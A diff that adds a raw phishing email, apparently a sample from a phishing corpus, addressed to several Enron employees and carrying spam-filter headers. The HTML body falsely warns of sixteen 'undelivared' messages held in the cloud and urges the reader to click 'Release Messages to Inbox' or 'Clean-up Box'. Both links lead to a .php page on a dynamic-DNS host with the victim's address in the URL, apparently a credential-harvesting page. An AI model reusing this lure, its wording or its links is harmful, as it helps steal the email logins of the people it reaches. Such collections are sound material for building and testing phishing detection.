@@ -1,0 +1,147 @@
+Return-Path: <test@attack.com>
+From: admin@security.waw.pl
+To: susan.bailey@enron.com, stephanie.panus@enron.com, tana.jones@enron.com, 
+Subject: Undeliverable_Emails:
+Date: 03 Sep 2019 04:19:58 +0200
+Message-ID: <20190903041956.16A7B9AAF3B92B2B@yingzeconsultancy.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Easynet-ES-Outgoing-Spam-Score: 0.1 (/)
+X-Outgoing-Spam-Report: Spam detection software, running on the system "aspam2.nsa.es.easynet.net", has
+ identified this incoming email as possible spam.  The original message
+ has been attached to this so you can view it (if it isn't spam) or label
+ similar future email.  If you have any questions, see
+ @@CONTACT_ADDRESS@@ for details.
+ 
+ Content preview:  Email: jose@monkey.org , You have {16} undelivared messages
+    clustered on your cloud, awaiting approval from you to be delivared. please
+    note, this is likely to cause inbox to cease function in incoming messages,
+    follow this instruction: [...] 
+ 
+ Content analysis details:   (0.1 points, 0.0 required)
+ 
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+ -1.0 ALL_TRUSTED            Passed through trusted hosts only via SMTP
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  1.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+X-Outgoing-SpamScan-Signature: 39d0b6dc95dc533a05a81d2341ce9078
+X-Easynet-bounce-key: easynet.es;training@yingzeconsultancy.com;1567478345;ade2e1ab;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 168
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19400"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI"=
+, "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: nor=
+mal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+33,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
+l; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial'>Email:<SPAN>&nbsp;</SPAN></SPAN>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI"=
+, "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: nor=
+mal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
+l; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial'><FONT color=3D#073763>jose@monkey.org</FONT=
+><FONT color=3D#212121>&nbsp;,</FONT></SPAN>
+<BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial'>
+<BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial'>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI"=
+, "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: nor=
+mal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+33,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
+l; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial'>You have {16} undelivared messages clustere=
+d on your cloud, awaiting approval from you to be delivared.</SPAN>
+<BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial'>
+<BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial'>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI"=
+, "Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: nor=
+mal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+33,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
+l; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-style: initial;=20
+text-decoration-color: initial'>please note, this is likely to cause inbox =
+to cease function in incoming messages, follow this instruction:&nbsp;</SPA=
+N>
+<BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
+"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
+,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial'></P>
+<P style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "=
+Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: normal=
+; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,=
+33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
+decoration-style: initial; text-decoration-color:=20
+initial'><A style=3D"COLOR: rgb(17,85,204)" href=3D"https://byenta.sytes.ne=
+t/xy/XZXXSE345CDC/BBBBBRR4444444/101454858.php?email=3Djose@monkey.org" rel=
+=3D"noopener noreferrer" target=3D_blank data-saferedirecturl=3D"https://ww=
+w.google.com/url?q=3Dhttps://vodevice.com/64926950bb1f5acd6fc01acc740fd5fe?=
+tyid%3Dc3llZC5hcnNoYWRAemFtaWxhbC5jb20%3D&amp;source=3Dgmail&amp;ust=3D1567=
+550621629000&amp;usg=3DAFQjCNH3ognsOcAhyqqJfaLEOzb3Wdd2fg">1. Release Messa=
+ges to Inbox</A></P>
+<P style=3D'FONT-SIZE: 15px; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "=
+Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: normal=
+; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,=
+33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
+decoration-style: initial; text-decoration-color:=20
+initial'><A style=3D"COLOR: rgb(17,85,204)" href=3D"https://byenta.sytes.ne=
+t/xy/XZXXSE345CDC/BBBBBRR4444444/101454858.php?email=3Djose@monkey.org" rel=
+=3D"noopener noreferrer" target=3D_blank data-saferedirecturl=3D"https://ww=
+w.google.com/url?q=3Dhttps://vodevice.com/64926950bb1f5acd6fc01acc740fd5fe?=
+tyid%3Dc3llZC5hcnNoYWRAemFtaWxhbC5jb20%3D&amp;source=3Dgmail&amp;ust=3D1567=
+550621629000&amp;usg=3DAFQjCNH3ognsOcAhyqqJfaLEOzb3Wdd2fg">2. Clean-up Box<=
+/A></P></BODY></HTML>
